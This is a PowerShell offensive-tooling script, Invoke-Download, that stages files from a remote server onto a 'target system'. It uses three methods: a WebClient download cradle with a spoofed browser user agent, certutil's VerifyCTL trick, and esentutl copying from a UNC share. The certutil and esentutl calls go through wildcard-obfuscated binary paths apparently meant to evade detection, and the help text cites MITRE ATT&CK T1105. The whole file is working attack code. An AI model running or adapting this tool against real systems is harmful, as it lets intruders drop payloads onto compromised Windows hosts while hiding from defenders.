function Invoke-Download {
<#
                                          
.SYNOPSIS
	Commands for downloading files to the target system.

.PARAMETER Help
	Shows detailed help for each function.

.PARAMETER List
	Shows summary list of available functions.

.PARAMETER PsDownload
	Downloads a file to the target system using a traditional powershell 'DownloadFile' cradle.

.PARAMETER CertUtil
	Uses certutil.exe to download a file to the target system. Uses the "VerifyCTL" method. 

.PARAMETER Esentutl
	Uses Esentutil.exe to download a file from a remote UNC Path.
	
.EXAMPLE
	PS> Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe

.EXAMPLE
	PS> Invoke-Download -CertUtil -RemoteFile http://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
	
.EXAMPLE
	PS> Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile C:\temp\file.exe
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>
[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$PsDownload,
	[String]$RemoteFile,
	[String]$LocalFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$CertUtil,
	[String]$LocalFile2=[String]$LocalFile,
	[String]$RemoteFile2=[string]$RemoteFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$EsentUtl,
	[String]$RemoteUNCPath,
	[String]$LocalFile3=[String]$LocalFile
)

	if ($Help -eq $True) {
		
		Write @"
	
 ### Invoke-Download Help ###
 ----------------------------
 Available Invoke-Download Commands:
 -----------------------------------
 |-----------------------------------------------------------------------------|
 | -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file               |
 |-----------------------------------------------------------------------------|

   [*] Description: Downloads a file to the target system using a traditional 
       powershell 'DownloadFile' cradle.                          	 

   [*] Usage: Invoke-Download -PsDownload -RemoteFile https://server/File.exe 
       -LocalFile C:\temp\File.exe 

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                               
 
 |-----------------------------------------------------------------------------|
 | -CertUtil  [-RemoteFile] remote_File [-LocalFile] localfile                 |
 |-----------------------------------------------------------------------------|

   [*] Description: Uses certutil.exe to download a file to the target system. 
       Uses the "VerifyCTL" method.

   [*] Usage: Invoke-Download -CertUtil -RemoteFile http://server/File.exe -LocalFile C:\temp\file.exe

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)
   
 |-----------------------------------------------------------------------------|
 | -Esentutl  [-RemoteUNCPath] remote_File [-LocalFile] local_file             |
 |-----------------------------------------------------------------------------|

   [*] Description: Uses Esentutil.exe to download a file from a remote UNC Path.

   [*] Usage: Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile C:\temp\file.exe

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)

 \-----------------------------------------------------------------------------/

"@
	}
	
	elseif ($List -eq $True) {
		Write @"

 Invoke-Download Brief Command Usage:
 ------------------------------------
 Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
 Invoke-Download -CertUtil -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
 Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile C:\temp\file.exe
 
"@
	}
	
	elseif ($PsDownload -and $RemoteFile -and $LocalFile) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		$h = "`n### Invoke-Download(PsDownload) ###`n"
		
		$dl = New-Object System.Net.WebClient
		$dl.headers.add("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5")
		$dl.downloadfile("$RemoteFile", "$LocalFile")
		
		if ($(Test-Path -path $LocalFile)) {
			$h
			Write " [+] File successfully downloaded to $LocalFile"
			$h
		}
		else {
			$h
			Write " [-] Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
			$h
		}
	}
	elseif ($Certutil -and $RemoteFile -and $LocalFile) {
	# https://twitter.com/egre55/status/1087685529016193025
	
		$RemoteFileName = $RemoteFile.Substring($RemoteFile.LastIndexOf("/") + 1)
		(C:\??*?\*3?\?er*ut?l.?x? -f -split -VerifyCTL $RemoteFile) | Out-null
		
		$LocalFile1 = (Get-Item *.bin).FullName
		
		Rename-Item $LocalFile1 $RemoteFileName
		Move-Item $RemoteFileName $LocalFile -Force
		
		if ($(Test-Path -path $LocalFile)) {
		
			Write-Output "`n [+] File downloaded to $LocalFile`n"
		}
		else {
			Write-Output "`n [!] Download Failed.`n"
		}
	}
	elseif ($EsentUtl -and $RemoteUNCPath -and $LocalFile) {
	# https://twitter.com/egre55/status/985994639202283520
	
		if ($(Test-Path -path "C:\windows\system32\esentutl.exe")) {
			Try {
				
				(C:\??*?\*3?\Es*n?U??.?x? /y $RemoteUNCPath /d $LocalFile /o)
				
				if ($(Test-Path -path $LocalFile)) {
					Write "`n [+] File successfully downloaded to $LocalFile`n"
				}
			}
			Catch {
				Write "`n [!] Unknown Error.`n"
			}
		}
		if (!$(Test-Path -path "C:\windows\system32\esentutl.exe")) {
			Write "`n [!] Can't find esentutil.exe in its usual location. Unable to download file.`n"
		}
	}
}